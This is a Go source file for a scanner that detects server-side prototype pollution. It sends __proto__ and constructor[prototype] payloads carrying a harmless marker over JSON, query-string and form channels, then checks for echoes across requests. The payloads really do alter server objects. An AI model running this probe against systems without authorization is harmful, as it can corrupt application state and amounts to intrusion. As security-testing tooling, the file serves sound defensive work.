// spprobe — OMEGA server-side prototype pollution gadget prober (Go core).
//
// Server-side prototype pollution (SPP) detection: candidate endpoints
// that merge user JSON into objects are probed with pollution payloads
// across THREE delivery channels (JSON body, query string, URL-encoded
// body) using the classic `__proto__[polluted]=yes` /
// `constructor[prototype][polluted]=yes` forms. Detection is
// differential: after polluting via candidate A, candidate B is
// checked for cross-request pollution (`polluted` echo), and each
// candidate's clean response is baselined first. Read-only GETs only
// for verification; the pollution POST bodies are inert objects with
// no business fields.
//
// Input (JSON stdin):
//
//	{"target":"http://h","endpoints":["/api/settings"],
//	 "check":"/api/settings","timeout_ms":3000}
//
// Output (JSON stdout):
//
//	{"results":[{"endpoint","channel","polluted":bool,"evidence":...}]}
package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

type input struct {
	Target    string   `json:"target"`
	Endpoints []string `json:"endpoints"`
	Check     string   `json:"check"`
	TimeoutMs int      `json:"timeout_ms"`
}

var jsonPayloads = []string{
	`{"__proto__":{"polluted":"omega-yes"}}`,
	`{"constructor":{"prototype":{"polluted":"omega-yes"}}}`,
	`{"__proto__.polluted":"omega-yes"}`,
}

var queryPayloads = []string{
	`__proto__[polluted]=omega-yes`,
	`constructor[prototype][polluted]=omega-yes`,
	`__proto__.polluted=omega-yes`,
	`constructor.prototype.polluted=omega-yes`,
}

func emit(v interface{}) {
	out, _ := json.Marshal(v)
	fmt.Println(string(out))
}

func main() {
	raw, _ := io.ReadAll(bufio.NewReaderSize(os.Stdin, 1<<20))
	var in input
	if err := json.Unmarshal(raw, &in); err != nil || in.Target == "" {
		emit(map[string]interface{}{"error": "invalid input"})
		return
	}
	base := strings.TrimRight(in.Target, "/")
	if !strings.HasPrefix(base, "http") {
		base = "http://" + base
	}
	endpoints := in.Endpoints
	if len(endpoints) == 0 {
		endpoints = []string{"/"}
	}
	check := in.Check
	if check == "" {
		check = endpoints[0]
	}
	timeout := 3 * time.Second
	if in.TimeoutMs > 0 {
		timeout = time.Duration(in.TimeoutMs) * time.Millisecond
	}
	client := &http.Client{Timeout: timeout}
	get := func(p string) (int, string) {
		resp, err := client.Get(base + p)
		if err != nil {
			return 0, ""
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		return resp.StatusCode, string(b)
	}
	post := func(p, body, ctype string) (int, string) {
		resp, err := client.Post(base+p, ctype,
			bytes.NewBufferString(body))
		if err != nil {
			return 0, ""
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		return resp.StatusCode, string(b)
	}
	hasMarker := func(s string) bool {
		return strings.Contains(s, "omega-yes")
	}

	results := []map[string]interface{}{}
	for _, ep := range endpoints {
		// baseline: clean response must not contain the marker
		_, clean := get(ep)
		if hasMarker(clean) {
			continue // endpoint already echoes the marker: unusable
		}
		for _, pl := range jsonPayloads {
			st, body := post(ep, pl, "application/json")
			if st == 0 {
				continue
			}
			// cross-request verification via a fresh GET
			_, verify := get(check)
			polluted := hasMarker(body) || hasMarker(verify)
			results = append(results, map[string]interface{}{
				"endpoint": ep, "channel": "json",
				"status": st, "polluted": polluted,
				"evidence": fmt.Sprintf("marker in response: %v, marker in verify request: %v", hasMarker(body), hasMarker(verify)),
			})
		}
		for _, pl := range queryPayloads {
			st, body := get(ep + "?" + pl)
			if st == 0 {
				continue
			}
			_, verify := get(check)
			polluted := hasMarker(body) || hasMarker(verify)
			results = append(results, map[string]interface{}{
				"endpoint": ep, "channel": "query",
				"status": st, "polluted": polluted,
				"evidence": fmt.Sprintf("marker in response: %v, marker in verify request: %v", hasMarker(body), hasMarker(verify)),
			})
		}
		// url-encoded form channel
		st, body := post(ep, "__proto__[polluted]=omega-yes",
			"application/x-www-form-urlencoded")
		if st != 0 {
			_, verify := get(check)
			results = append(results, map[string]interface{}{
				"endpoint": ep, "channel": "form",
				"status":   st,
				"polluted": hasMarker(body) || hasMarker(verify),
			})
		}
	}
	emit(map[string]interface{}{"target": in.Target, "results": results})
}
